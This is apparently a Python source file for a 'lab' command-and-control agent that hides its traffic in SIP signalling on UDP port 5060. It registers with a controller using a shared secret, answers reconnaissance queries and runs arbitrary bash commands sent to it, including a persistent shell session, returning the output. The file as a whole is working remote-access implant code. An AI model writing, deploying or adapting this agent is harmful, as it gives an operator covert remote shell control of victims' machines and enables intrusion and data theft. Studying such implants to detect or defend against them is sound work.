import argparse
import getpass
import os
import platform
import shutil
import select
import socket
import subprocess
import time

from sip import build, parse

COMMANDS = {
    "ping": lambda: "pong",
    "info": lambda: f"{platform.system()} {platform.release()} {platform.machine()}",
    "hostname": socket.gethostname,
    "user": getpass.getuser,
    "whoami": getpass.getuser,
    "time": lambda: time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    "disk": lambda: "disk /: {:.1f} GiB libres / {:.1f} GiB".format(
        shutil.disk_usage("/").free / 2**30, shutil.disk_usage("/").total / 2**30
    ),
}
BASH = None


def close_bash(kill=False):
    global BASH
    if kill:
        BASH.kill()
    BASH.wait(timeout=5)
    BASH.stdin.close()
    BASH.stdout.close()
    BASH = None


def bash_session(command):
    global BASH
    if command == "exit":
        BASH.stdin.write(b"exit\n")
        BASH.stdin.flush()
        close_bash()
        return "session bash fermée"

    marker = f"__SIPSOUP_{time.time_ns()}__"
    BASH.stdin.write(f"{command}\nprintf '\\n{marker}%s\\n' $?\n".encode())
    BASH.stdin.flush()
    output = b""
    deadline = time.monotonic() + 30
    marker = ("\n" + marker).encode()
    while select.select([BASH.stdout], [], [], max(0, deadline - time.monotonic()))[0]:
        chunk = os.read(BASH.stdout.fileno(), 4096)
        if not chunk:
            close_bash()
            return "session bash terminée"
        output += chunk
        start = output.find(marker)
        end = output.find(b"\n", start + len(marker)) if start >= 0 else -1
        if end >= 0:
            status = output[start + len(marker):end].decode(errors="replace")
            result = output[:start].decode(errors="replace").rstrip()
            return result or f"code de sortie: {status}"
    close_bash(kill=True)
    return "commande interrompue après 30 s"


def execute(command):
    global BASH
    if command == "bash":
        if BASH is None:
            BASH = subprocess.Popen(
                ["bash"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
        return "session bash ouverte"
    if command.startswith("bash-session ") and BASH is not None:
        return bash_session(command[13:])
    if command.startswith("bash "):
        try:
            result = subprocess.run(
                ["bash", "-lc", command[5:]],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=30,
            )
            return result.stdout.rstrip() or f"code de sortie: {result.returncode}"
        except subprocess.TimeoutExpired:
            return "commande interrompue après 30 s"
    return COMMANDS[command]() if command in COMMANDS else "commande refusée"


def main():
    parser = argparse.ArgumentParser(description="Agent SIPSOUP de laboratoire")
    parser.add_argument("--id", required=True)
    parser.add_argument("--server", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5060)
    args = parser.parse_args()
    secret = os.environ.get("SIPSOUP_SECRET") or os.environ.get("SIP_C2_SECRET")
    if not secret:
        parser.error("SIPSOUP_SECRET est requis")

    server = (args.server, args.port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 0))
    sock.sendto(build("REGISTER", "sipsoup", args.id, "online", secret), server)
    seen = set()
    while True:
        data, address = sock.recvfrom(65535)
        if address != server:
            continue
        try:
            method, target, sender, body = parse(data, secret, seen)
            if method == "MESSAGE" and target == args.id and sender == "sipsoup":
                sock.sendto(build("MESSAGE", "sipsoup", args.id, execute(body), secret), server)
        except (UnicodeError, ValueError):
            continue


if __name__ == "__main__":
    main()
